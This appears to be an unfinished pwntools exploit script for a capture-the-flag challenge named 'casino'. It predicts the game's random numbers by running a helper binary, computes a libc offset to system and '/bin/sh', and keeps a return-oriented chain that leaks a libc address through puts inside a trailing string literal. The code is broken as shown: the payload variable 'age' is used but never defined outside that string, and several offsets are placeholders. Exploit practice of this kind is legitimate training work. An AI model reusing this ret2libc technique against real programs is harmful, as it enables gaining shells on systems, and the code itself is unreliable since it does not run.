# Please run with python2.7 for better compatibility
'''
0000000000601ff0 R_X86_64_GLOB_DAT  __libc_start_main@GLIBC_2.2.5
'''
from pwn import *

context.clear(arch='x86_64')

# name
name = '\x00' * 20

# random number
p = process('./gen_num.out')
numbers = p.recvall().decode().split('\n')
del numbers[-1]
p.close()

# calculate offset for system library
libc = ELF('libc-2.23.so')
binsh_offset = next(libc.search('/bin/sh')) - libc.symbols['system']

pop_call_offset = 0x107419

system_base = 0x0
# send
r = process("./casino")
# r = remote('edu-ctf.csie.org', 10172)
r.sendlineafter('name: ', name)
pause()
r.sendlineafter('age: ', age)
pause()

for cnt_try in range(0, 2):
    cnt_num = 0
    if cnt_try == 1:
        for i in numbers:
            r_out = 'Chose the number ' + str(cnt_num) + ': '
            r.sendlineafter(r_out, str(i))
            cnt_num += 1
    elif cnt_try == 0:
        for i in range(0, 6):
            r_out = 'Chose the number ' + str(cnt_num) + ': '
            r.sendlineafter(r_out, str(i))
            cnt_num += 1
    r.sendlineafter('0:no]:', '0')

r.interactive()
r.close()

'''
puts_plt = 0x4006e0

libc = 0x6060f0
libc_start_main_got = 0x601ff0

main = 0x400b21
system_offset = 123
system_func_ptr = libc + system_offset
bin_sh_offset = 0x1b3e90
bin_sh = libc + bin_sh_offset

pop_rdi_ret = 0x400c23
ret = 0x4006b6

age = flat(pop_rdi_ret, libc_start_main_got, puts_plt, main)
'''
